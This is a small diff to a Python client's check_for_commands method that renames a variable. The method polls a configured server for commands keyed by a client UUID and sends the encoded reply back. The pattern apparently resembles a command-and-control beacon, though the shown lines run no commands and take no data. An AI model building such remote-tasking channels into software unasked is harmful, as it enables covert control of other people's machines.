@@ -70,10 +70,10 @@ class Client:
 
     @staticmethod
     def check_for_commands():
-        command_response = requests.get(config.server + 'commands/' + config.uuid)
+        command = requests.get(config.server + 'commands/' + config.uuid)
 
-        if command_response.status_code == 200:
-            requests.get(config.server + 'command_response/' + config.uuid + Client.encode(command_response.text))
+        if command.status_code == 200:
+            requests.get(config.server + 'command_response/' + config.uuid + Client.encode(command.text))
         else:
             print('No Commands Found - Possible Connection Error')
 
